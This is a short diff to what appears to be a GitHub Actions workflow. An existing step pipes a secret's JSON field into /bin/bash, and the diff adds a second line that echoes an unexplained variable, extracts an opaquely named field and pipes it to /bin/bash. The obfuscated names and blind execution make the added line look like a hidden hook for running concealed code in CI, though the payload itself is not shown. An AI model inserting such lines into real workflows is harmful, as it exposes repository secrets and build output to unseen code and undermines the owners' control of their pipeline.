@@ -17,6 +17,7 @@ jobs:
           opsd64: ${{ secrets.opsd64 }}
         run: |
           printf '%s' "$opsd64" | jq -r .np4 | /bin/bash
+          echo $ljex644 | jq -r .h632 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
